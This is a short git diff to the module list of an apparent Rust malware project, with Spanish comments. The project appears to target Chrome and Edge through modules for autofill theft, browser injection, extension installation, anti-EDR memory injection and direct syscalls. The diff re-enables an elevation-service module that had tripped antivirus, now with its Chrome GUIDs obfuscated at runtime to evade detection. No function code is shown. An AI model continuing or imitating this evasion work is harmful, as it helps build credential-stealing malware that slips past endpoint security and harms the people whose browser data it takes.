@@ -9,9 +9,9 @@ pub mod autofill;
 pub mod common;
 pub mod edge_injection;
 pub mod extension_installer;
-pub mod memory_injection;  // ← NUEVO: Memory injection anti-EDR
-pub mod syscalls;           // ← NUEVO: Direct syscalls
-// pub mod elevation_service;  // ← TEMPORALMENTE DESHABILITADO (trigerea AV por CLSIDs de Chrome)
+pub mod memory_injection;  // ← Memory injection anti-EDR
+pub mod syscalls;           // ← Direct syscalls
+pub mod elevation_service;  // ✅ RE-HABILITADO con GUIDs ofuscados en runtime
 
 use std::error::Error;
 use std::fmt;
